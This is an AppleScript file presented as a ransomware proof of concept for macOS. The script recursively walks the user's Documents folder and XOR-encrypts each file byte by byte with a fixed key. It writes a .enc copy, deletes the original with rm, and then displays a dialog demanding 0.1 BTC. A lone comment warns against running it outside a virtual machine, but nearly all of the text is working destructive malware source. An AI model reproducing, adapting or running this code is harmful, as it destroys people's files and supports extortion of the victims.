-- 🛑 AppleScript Ransomware PoC (XOR encryption)
-- Encrypts user files recursively in ~/Documents using a fixed key
-- Do not run outside a virtual machine or research container

-- Define encryption key (simple XOR)
set xorKey to 23

-- Get list of files in Documents (recursive)
set targetDir to POSIX path of (path to documents folder)
set fileList to paragraphs of (do shell script "find " & quoted form of targetDir & " -type f ! -name \"*.enc\"")

-- Encrypt each file
repeat with f in fileList
	try
		set hex to do shell script "xxd -p " & quoted form of f
		set encText to ""
		repeat with i from 1 to (length of hex) by 2
			set byteHex to text i thru (i + 1) of hex
			set n to do shell script "echo $((0x" & byteHex & " ^ " & xorKey & "))"
			set encText to encText & text -2 thru -1 of ("00" & do shell script "printf '%x' " & n)
		end repeat
		-- Save encrypted hex to new file
		set outPath to f & ".enc"
		do shell script "echo " & quoted form of encText & " | xxd -r -p > " & quoted form of outPath
		do shell script "rm " & quoted form of f
	end try
end repeat

-- Optional: display ransom note
display dialog "Your documents have been encrypted. To recover them, send 0.1 BTC to our wallet and contact us with proof." buttons {"OK"} default button 1
